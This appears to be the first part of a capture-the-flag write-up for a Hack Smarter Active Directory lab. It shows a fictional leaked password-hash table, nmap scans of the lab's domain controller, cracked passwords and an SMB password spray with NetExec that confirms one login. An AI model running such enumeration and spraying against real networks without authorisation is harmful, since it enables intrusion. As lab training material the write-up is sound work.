# Building Magic (Hack Smarter Labs)

## Scope and Objective

**Objective:** As a penetration tester on the Hack Smarter Red Team, your aim is to achieve a full compromise of the Active Directory environment.

**Initial Access:** A prior enumeration phase has yielded a leaked database containing user credentials (usernames and hashed passwords). This information will serve as your starting point for gaining initial access to the network.

**Execution:** Your task is to leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve a complete compromise of the domain.

**Note to user:** To access the target machine, you must add the following entries to your /etc/hosts file:
    
    buildingmagic.local
    dc01.buildingmagic.local
    
**Leaked Database File:**
```bash
id	username	full_name	role		password
1	r.widdleton	Ron Widdleton	Intern Builder	c4a21c4d438819d73d24851e7966229c
2	n.bottomsworth	Neville Bottomsworth Plannner	61ee643c5043eadbcdc6c9d1e3ebd298
3	l.layman	Luna Layman	Planner		8960516f904051176cc5ef67869de88f
4	c.smith		Chen Smith	Builder		bbd151e24516a48790b2cd5845e7f148
5	d.thomas	Dean Thomas	Builder		4d14ff3e264f6a9891aa6cea1cfa17cb
6	s.winnigan	Samuel Winnigan	HR Manager	078576a0569f4e0b758aedf650cb6d9a
7	p.jackson	Parvati Jackson	Shift Lead	eada74b2fa7f5e142ac412d767831b54
8	b.builder	Bob Builder	Electrician	dd4137bab3b52b55f99f18b7cd595448
9	t.ren		Theodore Ren	Safety Officer	bfaf794a81438488e57ee3954c27cd75
10	e.macmillan	Ernest Macmillan Surveyor	47d23284395f618bea1959e710bc68ef
```

---

## Initial Recon

### Nmap Scan
```bash
nmap 10.0.29.68    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 10:17 PKT
Nmap scan report for buildingmagic.local (10.0.29.68)
Host is up (0.23s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
```
```bash
nmap -A -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,8080 10.0.29.68 -o nmap-scan.log
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 10:18 PKT
Nmap scan report for buildingmagic.local (10.0.29.68)
Host is up (0.28s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-21 05:19:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-21T05:20:12+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.BUILDINGMAGIC.LOCAL
| Not valid before: 2025-09-02T21:29:10
|_Not valid after:  2026-03-04T21:29:10
| rdp-ntlm-info: 
|   Target_Name: BUILDINGMAGIC
|   NetBIOS_Domain_Name: BUILDINGMAGIC
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: BUILDINGMAGIC.LOCAL
|   DNS_Computer_Name: DC01.BUILDINGMAGIC.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-21T05:19:33+00:00
8080/tcp open  http          Werkzeug httpd 3.1.3 (Python 3.13.3)
|_http-title: Building Magic Application Portal
|_http-server-header: Werkzeug/3.1.3 Python/3.13.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-21T05:19:33
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   319.12 ms 10.200.0.1
2   ...
3   323.73 ms buildingmagic.local (10.0.29.68)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.15 seconds
```

---

## Hash Cracking

![image.png]()

Successfull cracks:
`lilronron` `shadowhex7`

---

## Identifying Valid Credentials

```bash
cat users.txt

r.widdleton
n.bottomsworth
l.layman
c.smith
d.thomas
s.winnigan
p.jackson
b.builder
t.ren
e.macmillan
```
```bash
nxc smb 10.0.29.68 -u users.txt -p 'lilronron'
SMB         10.0.29.68      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)                                   
SMB         10.0.29.68      445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron
```
`r.widdleton:lilronron`
